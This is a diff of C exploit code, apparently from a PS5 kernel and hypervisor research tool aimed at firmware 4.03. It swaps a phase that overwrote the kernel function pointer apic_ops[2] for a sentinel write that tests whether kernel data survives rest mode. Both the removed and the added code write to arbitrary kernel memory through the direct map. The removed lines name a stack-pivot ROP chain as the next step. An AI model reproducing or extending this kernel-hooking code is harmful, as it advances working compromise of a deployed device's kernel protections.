@@ -5245,6 +5245,7 @@ static void campaign_flatz_setup(void) {
         #define PHASE7_MARKER 0x42EFCDABUL
         #define P7_CAVE_MAGIC    0x464C41545A484F4FULL  /* "FLATZHOO" */
         #define P7_MARKER_SIZE   32
+        #define P7_SENTINEL_MAGIC 0xDEAD7E57CAFE4F50ULL
 
         int p7_is_post_resume = 0;
         uint64_t p7_hook_addr = ops[2];
@@ -5294,88 +5295,90 @@ static void campaign_flatz_setup(void) {
             else
                 printf("    Original saved: (unavailable — QA flags were reinitialized)\n");
 
-            /* Recover hook target from cave marker (offset 0x18) */
-            uint64_t cave_hook_target = 0;
+            /* Recover sentinel_orig from cave marker (offset 0x18) */
+            uint64_t saved_sentinel_orig = 0;
             {
                 uint64_t cp = va_to_pa_quiet(g_kdata_base);
                 if (cp) {
                     uint8_t cd[P7_MARKER_SIZE];
                     kernel_copyout(g_dmap_base + cp, cd, P7_MARKER_SIZE);
-                    memcpy(&cave_hook_target, &cd[0x18], 8);
+                    memcpy(&saved_sentinel_orig, &cd[0x18], 8);
                 }
             }
 
-            /* Classify where apic_ops[2] points */
-            int hook_in_kdata = (xapic_now >= g_kdata_base &&
-                                 xapic_now < g_kdata_base + 0x2000000);
-            int hook_in_ktext = (xapic_now >= g_ktext_base &&
-                                 xapic_now < g_ktext_base + 0x2000000);
+            /*
+             * Check sentinel marker (ops[n_ops], right after table).
+             * We wrote P7_SENTINEL_MAGIC there pre-suspend.
+             */
+            int sentinel_offset = n_ops * 8;
+            uint64_t sentinel_now = 0;
+            kernel_copyout(g_dmap_base + ops_pa + sentinel_offset,
+                           &sentinel_now, 8);
 
-            if (cave_hook_target == 0) {
-                /* Marker-only test (no hook was set pre-suspend) */
-                printf("\n[*] Marker-only test (apic_ops[2] was NOT hooked).\n");
-                printf("    apic_ops[2] = 0x%016lx\n", (unsigned long)xapic_now);
-                if (orig_xapic)
-                    printf("    Original    = 0x%016lx (%s)\n",
-                           (unsigned long)orig_xapic,
-                           xapic_now == orig_xapic ? "MATCH" : "CHANGED!");
-                printf("\n[+] Persistence test results:\n");
-                printf("    Cave marker: PERSISTED\n");
-                printf("    QA flags:    %s\n",
-                       (p7_qa[0] == 0xFF && p7_qa[1] == 0xFF) ?
-                       "PERSISTED" : "reinitialized");
-                printf("    KASLR:       tested below\n");
-                printf("\n[*] This was a marker-only run. Next run will\n");
-                printf("    hook apic_ops[2] to a known ktext address.\n");
-            } else if (!hook_in_ktext && !hook_in_kdata) {
-                printf("\n[+] ============================================\n");
-                printf("[+]  APIC_OPS HOOK SURVIVED RESUME!\n");
-                printf("[+] ============================================\n");
-                printf("[+] apic_ops[2] points outside ktext/kdata.\n");
-                printf("[+] Hook address: 0x%016lx\n", (unsigned long)xapic_now);
-            } else if (cave_hook_target && xapic_now == cave_hook_target) {
-                /* Hook survived! apic_ops[2] still has our written value */
-                printf("\n[+] ============================================\n");
-                printf("[+]  APIC_OPS[2] HOOK SURVIVED RESUME!\n");
-                printf("[+] ============================================\n");
-                printf("[+] apic_ops[2] = 0x%016lx (our hook target)\n",
-                       (unsigned long)xapic_now);
-                printf("[+] Expected:     0x%016lx [MATCH]\n",
-                       (unsigned long)cave_hook_target);
-                if (orig_xapic)
-                    printf("[+] Original was: 0x%016lx\n",
-                           (unsigned long)orig_xapic);
-                printf("[+]\n");
-                printf("[+] CONFIRMED on FW 4.03:\n");
-                printf("[+]   1. Kernel .data (apic_ops) survives suspend/resume\n");
-                printf("[+]   2. apic_ops[2] is NOT reinitialized on resume\n");
-                printf("[+]   3. Hook to ktext address persists across rest mode\n");
-                printf("[+]   4. cpususpend_handler will call our hook target!\n");
-                printf("[+]\n");
-                printf("[+] The hook target (ktext func) was called during resume.\n");
-                printf("[+] If we're here with no crash: HOOK FIRES SAFELY!\n");
-                printf("[+]\n");
-                printf("[+] Next: use stack pivot gadget for full ROP chain.\n");
-            } else if (orig_xapic && xapic_now == orig_xapic &&
-                       cave_hook_target != orig_xapic) {
-                /* We hooked it, but it was restored to original */
-                printf("\n[-] apic_ops[2] was RESTORED to original by kernel.\n");
-                printf("    Current:  0x%016lx (original xapic_mode)\n",
-                       (unsigned long)xapic_now);
-                printf("    Expected: 0x%016lx (our hook target)\n",
-                       (unsigned long)cave_hook_target);
-                printf("    Kernel reinitializes apic_ops during resume.\n");
-                printf("\n[!] The flatz method apic_ops approach may not work\n");
-                printf("    on FW 4.03 — kernel restores function pointers.\n");
+            printf("\n[*] Sentinel check (ops[%d], after table):\n", n_ops);
+            printf("    Current:        0x%016lx\n",
+                   (unsigned long)sentinel_now);
+            printf("    Expected magic: 0x%016lx\n",
+                   (unsigned long)P7_SENTINEL_MAGIC);
+            printf("    Pre-suspend original: 0x%016lx\n",
+                   (unsigned long)saved_sentinel_orig);
+
+            int sentinel_survived = (sentinel_now == P7_SENTINEL_MAGIC);
+            int sentinel_restored = (sentinel_now == saved_sentinel_orig &&
+                                     saved_sentinel_orig != P7_SENTINEL_MAGIC);
+
+            if (sentinel_survived) {
+                printf("    → SENTINEL SURVIVED RESUME!\n");
+            } else if (sentinel_restored) {
+                printf("    → Sentinel restored to original (region reinitialized).\n");
             } else {
-                printf("\n[?] apic_ops[2] = 0x%016lx (unexpected)\n",
-                       (unsigned long)xapic_now);
-                printf("    Hook target was: 0x%016lx\n",
-                       (unsigned long)cave_hook_target);
-                if (orig_xapic)
-                    printf("    Original was:    0x%016lx\n",
-                           (unsigned long)orig_xapic);
-                printf("    Possible: KASLR changed, or partial restore.\n");
+                printf("    → Sentinel has unexpected value.\n");
+            }
+
+            /* Check apic_ops[2] — did it change? */
+            printf("\n[*] apic_ops[2] persistence check:\n");
+            printf("    apic_ops[2] now:      0x%016lx\n",
+                   (unsigned long)xapic_now);
+            if (orig_xapic) {
+                printf("    Original (pre-suspend): 0x%016lx\n",
+                       (unsigned long)orig_xapic);
+                if (xapic_now == orig_xapic)
+                    printf("    → MATCH — apic_ops[2] retained its value.\n");
+                else
+                    printf("    → CHANGED — kernel reinitialized apic_ops[2]!\n");
+            }
+
+            /* Summary */
+            int cave_persisted = (cave_marker_val == P7_CAVE_MAGIC);
+            int qa_persisted = (p7_qa[0] == 0xFF && p7_qa[1] == 0xFF);
+
+            printf("\n[+] ============================================\n");
+            printf("[+]  PERSISTENCE TEST RESULTS\n");
+            printf("[+] ============================================\n");
+            printf("[+]   Cave marker:   %s\n",
+                   cave_persisted ? "PERSISTED" : "LOST");
+            printf("[+]   QA flags:      %s\n",
+                   qa_persisted ? "PERSISTED" : "reinitialized");
+            printf("[+]   Sentinel:      %s\n",
+                   sentinel_survived ? "PERSISTED" :
+                   sentinel_restored ? "RESTORED (region reinit)" : "UNEXPECTED");
+            printf("[+]   apic_ops[2]:   %s\n",
+                   orig_xapic ?
+                   (xapic_now == orig_xapic ? "UNCHANGED (good for hook)"
+                                            : "CHANGED (kernel reinits)")
+                   : "(cannot compare — no saved original)");
+
+            if (sentinel_survived && orig_xapic && xapic_now == orig_xapic) {
+                printf("[+]\n");
+                printf("[+] KEY FINDING: apic_ops region survives resume AND\n");
+                printf("[+] apic_ops[2] is NOT reinitialized by kernel!\n");
+                printf("[+] → The flatz method (hook apic_ops[2]) IS viable.\n");
+                printf("[+] → Next: find a safe ktext gadget to hook with.\n");
+            } else if (!sentinel_survived) {
+                printf("[+]\n");
+                printf("[-] The apic_ops memory region does not survive resume.\n");
+                printf("    This means hooking apic_ops[2] won't persist.\n");
+                printf("    The flatz method may need a different approach.\n");
             }
 
             /* QA flags persistence check */
@@ -5419,20 +5422,12 @@ static void campaign_flatz_setup(void) {
                        (unsigned long)cave_marker_val);
             }
 
-            /* Restore apic_ops[2] to original if we have it */
-            if (orig_xapic && xapic_now != orig_xapic) {
-                printf("\n[*] Restoring apic_ops[2] → 0x%016lx\n",
-                       (unsigned long)orig_xapic);
-                kernel_copyin(&orig_xapic, g_dmap_base + ops_pa + 0x10, 8);
-                uint64_t verify_r = 0;
-                kernel_copyout(g_dmap_base + ops_pa + 0x10, &verify_r, 8);
-                printf("    Restored: 0x%016lx %s\n",
-                       (unsigned long)verify_r,
-                       verify_r == orig_xapic ? "[OK]" : "[MISMATCH]");
-            } else if (!orig_xapic && !hook_in_ktext) {
-                printf("\n[!] Cannot restore apic_ops[2] — original address unknown.\n");
-                printf("    QA flags were reinitialized on resume (expected on FW 4.03).\n");
-                printf("    Hook remains active. Re-run exploit to re-arm or reboot.\n");
+            /* Restore sentinel to original value */
+            if (sentinel_survived && saved_sentinel_orig != P7_SENTINEL_MAGIC) {
+                printf("\n[*] Restoring sentinel (ops[%d]) → 0x%016lx\n",
+                       n_ops, (unsigned long)saved_sentinel_orig);
+                kernel_copyin(&saved_sentinel_orig,
+                              g_dmap_base + ops_pa + sentinel_offset, 8);
             }
 
             /* Clear QA marker */
@@ -5443,41 +5438,43 @@ static void campaign_flatz_setup(void) {
             notify("[HV Research] Phase 7: Post-resume check complete!");
 
         } else {
-            /* ─── Pre-suspend: hook apic_ops[2] to known ktext address ─── */
-            printf("\n[*] Phase 7: Hook apic_ops[2] to known ktext address\n\n");
+            /* ─── Pre-suspend: safe persistence test on apic_ops ─── */
+            printf("\n[*] Phase 7: Safe apic_ops persistence test\n\n");
 
             /*
-             * APPROACH: Hook apic_ops[2] to a different KNOWN ktext func.
+             * APPROACH: Test if apic_ops data survives resume WITHOUT
+             * corrupting any function pointer that gets called.
              *
-             * We already know all 28 apic_ops function addresses from the
-             * table scan.  These are all in ktext, which is natively
-             * executable.  No NX clearing is needed.
+             * LESSON LEARNED: Hooking apic_ops[2] (xapic_mode) to a
+             * different ktext function (apic_create) caused system
+             * instability after resume — the wrong function corrupts
+             * APIC state, making the console unstable/frozen.
              *
-             * By writing a different known ktext address to apic_ops[2]
-             * (a pure 8-byte data write via DMAP), we test:
-             *   1. Does the write to apic_ops[2] survive suspend/resume?
-             *   2. Does the system crash when xapic_mode is called with
-             *      the wrong function?  (Probably not — it just returns.)
+             * SAFE APPROACH:
+             *   1. Write a marker value to a SAFE location near apic_ops
+             *      (8 bytes right after the table: ops[28], which is beyond
+             *      the 28-entry table and just leftover kdata).
+             *   2. Write persistence marker to kdata cave as before.
+             *   3. Do NOT modify any apic_ops function pointer.
+             *   4. On post-resume: check if ops[28] marker and cave marker
+             *      survived, AND check if apic_ops[2] still has its
+             *      original value (tells us if kernel reinits the table).
              *
-             * Hook target: ops[0] (apic_create) — a different ktext func.
-             * If xapic_mode is called and executes apic_create instead,
-             * the worst case is incorrect APIC state, but no panic.
+             * This answers the key question without any crash risk.
              */
 
             uint64_t original_xapic = ops[2];
-            uint64_t hook_target    = ops[0];  /* apic_create */
-
             printf("    apic_ops[2] (xapic_mode): 0x%016lx\n",
                    (unsigned long)original_xapic);
-            printf("    apic_ops[0] (create):     0x%016lx\n",
-                   (unsigned long)hook_target);
+            printf("    apic_ops entries: %d\n", n_ops);
 
-            if (hook_target == original_xapic) {
-                /* ops[0] == ops[2], try ops[3] instead */
-                hook_target = ops[3];
-                printf("    ops[0]==ops[2], using ops[3]: 0x%016lx\n",
-                       (unsigned long)hook_target);
-            }
+            /* Read the 8 bytes right after the table (ops[28]) */
+            uint64_t sentinel_offset = n_ops * 8;  /* byte offset past last entry */
+            uint64_t sentinel_orig = 0;
+            kernel_copyout(g_dmap_base + ops_pa + sentinel_offset,
+                           &sentinel_orig, 8);
+            printf("    Sentinel (ops[%d]) original: 0x%016lx\n",
+                   n_ops, (unsigned long)sentinel_orig);
 
             /* ── Step 1: Write persistence marker to kdata cave ── */
             printf("\n[*] Step 1: Writing persistence marker to kdata cave...\n");
@@ -5495,7 +5492,7 @@ static void campaign_flatz_setup(void) {
              *   0x00: 8 bytes — magic  ("FLATZHOO")
              *   0x08: 8 bytes — original_xapic address
              *   0x10: 8 bytes — ktext_base (for KASLR verification)
-             *   0x18: 8 bytes — hook_target (nonzero = hook was set)
+             *   0x18: 8 bytes — sentinel_orig (original ops[28] value)
              */
             uint8_t marker_data[P7_MARKER_SIZE];
             memset(marker_data, 0, sizeof(marker_data));
@@ -5503,7 +5500,7 @@ static void campaign_flatz_setup(void) {
             memcpy(&marker_data[0x00], &cave_magic, 8);
             memcpy(&marker_data[0x08], &original_xapic, 8);
             memcpy(&marker_data[0x10], &g_ktext_base, 8);
-            memcpy(&marker_data[0x18], &hook_target, 8);
+            memcpy(&marker_data[0x18], &sentinel_orig, 8);
 
             /* Save original cave content */
             uint8_t cave_backup[P7_MARKER_SIZE];
@@ -5519,10 +5516,6 @@ static void campaign_flatz_setup(void) {
             printf("    Cave KVA: 0x%lx  PA: 0x%lx\n",
                    (unsigned long)cave_kva, (unsigned long)cave_pa);
             printf("    Marker write: %s\n", marker_ok ? "OK" : "MISMATCH");
-            printf("    Magic:        0x%016lx\n", (unsigned long)cave_magic);
-            printf("    Orig xapic:   0x%016lx\n", (unsigned long)original_xapic);
-            printf("    Hook target:  0x%016lx\n", (unsigned long)hook_target);
-            printf("    ktext base:   0x%016lx\n", (unsigned long)g_ktext_base);
 
             if (!marker_ok) {
                 printf("[-] Marker write failed — restoring and aborting.\n");
@@ -5550,27 +5543,20 @@ static void campaign_flatz_setup(void) {
             printf("    QA marker: 0x%08x [%s]\n", mv,
                    mv == PHASE7_MARKER ? "OK" : "FAIL");
 
-            /* ── Step 3: Hook apic_ops[2] → known ktext address ── */
-            printf("\n[*] Step 3: Hooking apic_ops[2] → 0x%016lx...\n",
-                   (unsigned long)hook_target);
+            /* ── Step 3: Write sentinel marker to ops[28] ── */
+            printf("\n[*] Step 3: Writing sentinel to ops[%d]...\n", n_ops);
 
-            /* Write the hook target to apic_ops[2] via DMAP */
-            kernel_copyin(&hook_target, g_dmap_base + ops_pa + 0x10, 8);
+            uint64_t sentinel_val = P7_SENTINEL_MAGIC;
+            kernel_copyin(&sentinel_val,
+                          g_dmap_base + ops_pa + sentinel_offset, 8);
 
-            /* Verify the write */
-            uint64_t hook_verify = 0;
-            kernel_copyout(g_dmap_base + ops_pa + 0x10, &hook_verify, 8);
-            int hook_ok = (hook_verify == hook_target);
+            uint64_t sentinel_verify = 0;
+            kernel_copyout(g_dmap_base + ops_pa + sentinel_offset,
+                           &sentinel_verify, 8);
+            printf("    Wrote:    0x%016lx\n", (unsigned long)sentinel_val);
             printf("    Readback: 0x%016lx [%s]\n",
-                   (unsigned long)hook_verify,
-                   hook_ok ? "OK" : "MISMATCH");
-
-            if (!hook_ok) {
-                printf("[-] Hook write failed — restoring marker and aborting.\n");
-                kernel_copyin(cave_backup, g_dmap_base + cave_pa, P7_MARKER_SIZE);
-                fflush(stdout);
-                return;
-            }
+                   (unsigned long)sentinel_verify,
+                   sentinel_verify == sentinel_val ? "OK" : "MISMATCH");
 
             /* ── Step 4: Dump kdata PTE for reference ── */
             printf("\n[*] Step 4: kdata PTE diagnostics...\n");
@@ -5605,28 +5591,29 @@ static void campaign_flatz_setup(void) {
             }
 
             printf("\n[+] ============================================\n");
-            printf("[+]  APIC_OPS[2] HOOKED TO KNOWN KTEXT ADDRESS\n");
+            printf("[+]  SAFE PERSISTENCE TEST ARMED\n");
             printf("[+] ============================================\n");
             printf("[+]\n");
-            printf("[+] Hook details:\n");
-            printf("[+]   apic_ops[2] = 0x%016lx (was 0x%016lx)\n",
-                   (unsigned long)hook_target, (unsigned long)original_xapic);
-            printf("[+]   Target: apic_ops[0] (apic_create) in ktext\n");
-            printf("[+]   NO NX clearing — target is natively executable\n");
-            printf("[+]   NO kernel panic risk — pure data pointer write\n");
+            printf("[+] What was set:\n");
+            printf("[+]   Cave marker (kdata_base):  FLATZHOO magic\n");
+            printf("[+]   Sentinel (ops[%d]):        0x%016lx\n",
+                   n_ops, (unsigned long)sentinel_val);
+            printf("[+]   QA flags:                  Phase 7 marker\n");
+            printf("[+]   apic_ops[2]:               NOT MODIFIED (safe)\n");
             printf("[+]\n");
             printf("[+] WHAT THIS TESTS:\n");
-            printf("[+]   1. Does apic_ops[2] survive suspend/resume?\n");
-            printf("[+]   2. Does the system crash with wrong xapic_mode?\n");
-            printf("[+]   3. Is the hooked value restored by kernel?\n");
+            printf("[+]   1. Does kdata survive resume? (cave marker)\n");
+            printf("[+]   2. Does the apic_ops region survive? (sentinel)\n");
+            printf("[+]   3. Does apic_ops[2] retain its value? (compare)\n");
+            printf("[+]   4. Is KASLR stable? (ktext_base compare)\n");
             printf("[+]\n");
             printf("[+] NEXT STEPS:\n");
             printf("[+]   1. Enter REST MODE now\n");
             printf("[+]   2. Wake PS5 and re-run exploit\n");
-            printf("[+]   3. Check if apic_ops[2] still has hook target\n");
-            printf("[+]   4. If survived: flatz method is VIABLE on FW 4.03!\n");
+            printf("[+]   3. Post-resume will check all markers\n");
+            printf("[+]   4. NO system instability — no func ptrs modified\n");
 
-            notify("[HV Research] Phase 7: apic_ops[2] hooked! Enter REST MODE to test!");
+            notify("[HV Research] Phase 7: Safe test armed. Enter REST MODE!");
         }
 
         printf("\n");
